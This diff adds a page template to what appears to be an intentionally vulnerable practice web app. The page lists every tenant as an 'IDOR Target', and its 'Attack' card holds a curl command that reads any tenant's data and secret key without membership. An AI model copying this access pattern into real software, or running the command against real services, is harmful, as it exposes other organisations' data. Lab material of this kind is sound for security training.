@@ -1,0 +1,60 @@
+<%- include('../partials/navbar') %>
+<main class="main-content">
+  <div class="top-header"><span class="header-title">Tenant Management</span>
+    <div class="header-right"><a href="/profile/<%= user.id %>" class="header-user"><div class="header-avatar"><%= ((user.first_name||user.username).charAt(0)).toUpperCase() %></div></a></div>
+  </div>
+  <div class="page-body">
+    <div class="page-header"><h1>Multi-Tenant Workspace</h1><p>Manage your organisation workspaces.</p></div>
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:24px;max-width:960px;align-items:start;">
+      <div>
+        <div class="card mb-4"><div class="card-header"><h3>Your Tenants</h3></div>
+          <% if(!myTenants.length){ %>
+          <div class="card-body" style="color:var(--text-muted);font-size:13px;">You are not a member of any tenant.</div>
+          <% } else { myTenants.forEach(t => { %>
+          <div style="padding:12px 20px;border-bottom:1px solid var(--border-light);display:flex;justify-content:space-between;align-items:center;">
+            <div><div style="font-weight:600;"><%= t.name %></div><code style="font-size:11px;"><%= t.slug %></code></div>
+            <button onclick="fetchTenant('<%= t.slug %>')" class="btn btn-secondary btn-sm">View Data</button>
+          </div>
+          <% }) } %>
+        </div>
+
+        <div class="card" style="border-color:var(--danger);">
+          <div class="card-header" style="background:var(--danger-bg);"><h3>⚠️ All Tenants (IDOR Target)</h3></div>
+          <div class="card-body" style="padding:0;">
+            <% allTenants.forEach(t => { %>
+            <div style="padding:10px 20px;border-bottom:1px solid var(--border-light);display:flex;justify-content:space-between;align-items:center;">
+              <div><strong style="font-size:13px;"><%= t.name %></strong><br><code style="font-size:11px;"><%= t.slug %></code></div>
+              <button onclick="fetchTenant('<%= t.slug %>')" class="btn btn-danger btn-sm">Access →</button>
+            </div>
+            <% }) %>
+          </div>
+        </div>
+      </div>
+      <div>
+        <div class="card mb-4">
+          <div class="card-header"><h3>API Response</h3></div>
+          <pre id="tenant-result" style="font-size:11px;min-height:200px;padding:14px;margin:0;background:var(--page-bg);border-radius:var(--radius);">// Click a tenant to fetch its data...</pre>
+        </div>
+        <div class="card">
+          <div class="card-header"><h3>Attack</h3></div>
+          <div class="card-body" style="font-size:12px;">
+            <pre style="font-size:11px;"># Access any tenant without membership:
+curl "http://syntex.local/tenant/syntex-internal/data" \
+  -H "Cookie: SYNTEX_SESS=YOUR_SESSION"
+
+# The secret_key field is returned for ALL tenants
+# regardless of whether you belong to them</pre>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</main>
+</div><%- include('../partials/footer') %>
+<script>
+async function fetchTenant(slug) {
+  const r = await fetch(`/tenant/${slug}/data`);
+  const d = await r.json();
+  document.getElementById('tenant-result').textContent = JSON.stringify(d, null, 2);
+}
+</script>
